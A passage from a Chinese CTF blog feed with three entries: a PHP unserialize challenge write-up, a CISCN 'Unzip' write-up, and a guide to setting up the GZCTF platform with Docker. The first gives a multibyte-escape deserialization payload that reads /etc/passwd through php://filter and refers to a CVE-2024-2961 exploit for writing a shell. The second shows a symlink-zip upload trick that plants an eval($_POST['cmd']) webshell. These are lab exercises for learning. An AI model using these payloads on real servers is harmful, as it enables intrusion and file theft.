class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">read_file</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/etc/passwd&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;start=<span class="hljs-variable">$start</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;start == <span class="hljs-string">&quot;gxngxngxn&quot;</span>)&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;What you are reading is:&#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;start&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$readfile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">read_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;start&#x27;</span>]);<br>    <span class="hljs-variable">$read</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]:<span class="hljs-string">&quot;I_want_to_Read_flag&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$read</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$readfile</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ctf</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Start_Funny_CTF!!!&quot;</span>;<br>&#125; Start_Funny_CTF!!!<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>利用这个函数进行读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;start == <span class="hljs-string">&quot;gxngxngxn&quot;</span>)&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;What you are reading is:&#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>需要进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$read</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$readfile</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ctf</span>);<br></code></pre></td></tr></table></figure><p>先简单的测试一下在上部分构造序列化的样子</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-03162619.png" alt="2024-09-03162619"></p><p>传入gxngxngxn，长度为82。</p><p>接下来尝试利用file_get_contents，最常见的就是利用伪协议进行读取<code>php://filter/convert.base64-encode/resource=/etc/passwd</code></p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-03163445.png" alt="2024-09-03163445"></p><p>然后需要进行截取，详细的请看我nepctf的解析，简单的来说就是进行逃逸，利用%f0和%9f进行逃逸</p><p>需要逃逸的内容是<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:126:&quot;</code>,就是相当于覆盖前面的内容，用自己的链</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-03165332.png" alt="2024-09-03165332"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">read</span>=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f<br></code></pre></td></tr></table></figure><p>我对这个的理解就是增三减一，这题是38，构造13个%f0abc和1个%9f就可以达到覆盖的作用</p><p>通常到这一步应该就结束了，但是并不知道flag的文件名，还是需要命令执行，回收世界线。</p><p>官p给出的是考察了<a href="https://xz.aliyun.com/t/14690?time__1311=mqmx9QDtDQ0=ex0y34+g6YG8bou8xGIxx">CVE-2024-2961</a>,具体内容我们先按下不表，利用exp先打通一下。</p><p>这里借用的晨曦师傅的脚本，可以去了解一下，脚本需要微调一下，官方的也可以。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>其实环境弄了几个小时，一直有问题报错，基本的原理我已经懂了，先上payload吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">read</span>=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f&amp;start=O:9:<span class="hljs-string">&quot;read_file&quot;</span>:2:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:9:<span class="hljs-string">&quot;gxngxngxn&quot;</span>;s:8:<span class="hljs-string">&quot;filename&quot;</span>;s:55:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>;&#125;                              <br></code></pre></td></tr></table></figure><p>然后利用exp打通写马进去，这里注意环境要在3.10以上，尽量在linux环境，弄了半天没有完成orz，但是基本原理还是懂了的。</p><p>另起：昨天写完后回去突然就明白了,只需要把https改为http就可以成功了</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04153017.png" alt="2024-09-04153017"></p><p>然后读取flag</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04152836.png" alt="2024-09-04152836"></p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>serialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023ciscn-Unzip</title>
    <link href="/2024/09/02/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2023ciscn-Unzip/"/>
    <url>/2024/09/02/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2023ciscn-Unzip/</url>
    
    <content type="html"><![CDATA[<p>前言：😋，看到好友包师傅每日一题，我也打算开个每日一题，记录一下内容。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[在线靶场][<a href="https://ctf.show/challenges#Unzip-4002]">https://ctf.show/challenges#Unzip-4002]</a></p><p>初始界面是一个文件上传，随手上传一个一句话木马，进入页面。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this! </span><br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>代码做了一个简单的限制，要求的zip文件，这也是一个提示我们需要上传zip文件。</p><p>执行命令，在&#x2F;tmp目录下解压文件内容，这里-o是强覆盖，会覆盖名称一样的文件</p><p>众所周知，正常环境的代码需要在&#x2F;var&#x2F;www&#x2F;html下才能执行那题目固定了在tmp下，所以我们要尝试建立tmp和&#x2F;var&#x2F;www&#x2F;html的联系，这里就考察了软链接的知识点。<a href="https://www.bilibili.com/video/BV16Q4y1y7xS/?p=33">详细教学</a>，可以看这个视频，我们可以通过建立一个软链接先指向，再解压，就可以再&#x2F;var&#x2F;www&#x2F;html有shell了。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>首先创建软链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /var/www/html orange<br></code></pre></td></tr></table></figure><p>然后进行第一次压缩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip --symlinks orange1.zip orange<br></code></pre></td></tr></table></figure><p>symlinks的作用是不把orange这个软链接当作普通的文件，而是当作指向目录或者文件的存在</p><p>写一个一句话木马在shell.php下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后保存在orange目录下，执行第二次压缩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip -r orange2.zip orange<br></code></pre></td></tr></table></figure><p>先上传orange1.zip，进行在靶场上执行的就是解压进行了链接</p><p>再上传orange2.zip，这次解压把shell.php解压到了orange的目录下，成功的把shell.php传到了&#x2F;var&#x2F;www&#x2F;html目录下</p><p>打开shell.php，执行命令</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-02203229.png" alt="2024-09-02 203229"></p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次GZCTF搭建及动态容器</title>
    <link href="/2024/09/02/%E6%9D%82%E8%B0%88/%E8%AE%B0%E4%B8%80%E6%AC%A1GZCTF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8/"/>
    <url>/2024/09/02/%E6%9D%82%E8%B0%88/%E8%AE%B0%E4%B8%80%E6%AC%A1GZCTF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>前言：因为学校需要招新生要搭建平台，简单的学习了一下。</p><h1 id="GZCTF配置"><a href="#GZCTF配置" class="headerlink" title="GZCTF配置"></a>GZCTF配置</h1><p>环境 ubuntu 22.04</p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>更新源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt update <br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/update.png" alt="update"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>安装docker和docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install docker.io docker-compose<br></code></pre></td></tr></table></figure><p>中途按Y和Enter即可。</p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>docker换源</p><p>由于docker今年在中国地区的限制，需要换源才能正常的拉取。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/docker<br>sudo <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>        <span class="hljs-string">&quot;https://do.nark.eu.org&quot;</span>,<br>        <span class="hljs-string">&quot;https://dc.j8.work&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.m.daocloud.io&quot;</span>,<br>        <span class="hljs-string">&quot;https://dockerproxy.com&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.nju.edu.cn&quot;</span><br>    ]<br>&#125;<br>EOF<br>sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>配置文件appsettings.json和docker-compose.yml，可以新建GZCTF，然后将这两个文件放在这里</p><p>appsettings.json是环境的核心</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;AllowedHosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ConnectionStrings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Database&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=这里填写数据库密码&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;EmailConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;SendMailAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a@a.com&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Smtp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;localhost&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;Port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">587</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;XorKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;asdqwe&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ContainerProvider&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Docker&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;Kubernetes&quot;</span><br>      <span class="hljs-attr">&quot;PortMappingType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Default&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;PlatformProxy&quot;</span><br>      <span class="hljs-attr">&quot;EnableTrafficCapture&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;PublicEntry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;xx.xx.xx.xx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//服务器官网ip</span><br>      <span class="hljs-comment">// optional</span><br>      <span class="hljs-attr">&quot;DockerConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;SwarmMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;Uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;unix:///var/run/docker.sock&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;RequestLogging&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;DisableRateLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;RegistryConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;ServerAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;CaptchaConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Provider&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;CloudflareTurnstile&quot; or &quot;GoogleRecaptcha&quot;</span><br>      <span class="hljs-attr">&quot;SiteKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;Your SITE_KEY&gt;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;SecretKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;Your SECRET_KEY&gt;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-comment">// optional</span><br>      <span class="hljs-attr">&quot;GoogleRecaptcha&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;VerifyAPIAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;RecaptchaThreshold&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.5&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ForwardedOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;ForwardedHeaders&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;ForwardLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;TrustedNetworks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>上面的内容对于邮箱的验证没有填写，你需要填写<strong>数据库的密码</strong>，如果使用服务器的换填写服务器的ip，完全的功能请参照<a href="https://docs.ctf.gzti.me/zh/config/appsettings">GZCTF官方文档</a>。</p><p>docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;3.0&quot;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">gzctf:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">gztime/gzctf:latest</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;GZCTF_ADMIN_PASSWORD=这里填管理员密码&quot;</span><br>      <span class="hljs-comment"># choose your backend language `en_US` / `zh_CN` / `ja_JP`</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;LC_ALL=zh_CN.UTF-8&quot;</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:8080&quot;</span> <span class="hljs-comment">#如果备案了可以选择80</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/files:/app/files&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span><br>      <span class="hljs-comment"># - &quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot; # this is required for k8s deployment</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span> <span class="hljs-comment"># this is required for docker deployment</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br> <br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:alpine</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;POSTGRES_PASSWORD=数据库密码&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/db:/var/lib/postgresql/data&quot;</span><br></code></pre></td></tr></table></figure><p>这里填写管理员密码，数据库密码(<strong>必须个上一个的保持一致</strong>),端口看情况进行修改。</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/%E9%85%8D%E7%BD%AE.png" alt="配置"></p><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h2><p>拉取docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/docker.png" alt="docker"></p><p>等出现两个done之后就完成了，访问一下网页</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/%E7%BD%91%E9%A1%B5.png" alt="网页"></p><h1 id="动态容器出题"><a href="#动态容器出题" class="headerlink" title="动态容器出题"></a>动态容器出题</h1><p>我用的是探姬和巨魔师傅的项目，这里贴一下。<a href="https://github.com/CTF-Archives/ctf-docker-template">项目</a></p><p>正常的题型直接更换src就行了,我用的xftp上传到服务器，最后docker 拉取一下就行，这里以web题目为例子。</p><p>默认的网页是index需要注意一下。</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/%E4%BE%8B%E9%A2%98.png" alt="例题"></p><p>这是准备好的例题，然后我们使用xftp上传到服务器上</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/1.png" alt="1"></p><p>弄好之后创建比赛，选个web题动态容器，输入webtest就行，然后测试一下。</p><p>有dockerhub的也可以选择先传到那上面，看自己的选择。</p><h1 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h1><p>1.探姬项目的pwn题目默认是9999端口需要自己改一下</p><p>2.环境不能上传内容过大的附件，可以先上传网盘，再把链接贴上去。</p><p>3.流量抓捕我并没有设置，当时也忘了，等明年再说吧，详情也可以看官方文档</p><p>4.弄不好可以全删重新弄，orz，好事多磨。</p><h1 id="缝缝补补"><a href="#缝缝补补" class="headerlink" title="缝缝补补"></a>缝缝补补</h1><h2 id="数据库相关"><a href="#数据库相关" class="headerlink" title="数据库相关"></a>数据库相关</h2><ul><li>为了方便数据库修改，给数据库映射了端口，当然有一定的安全隐患，需要对安全组，密码强度有一定要求</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">db:<br><span 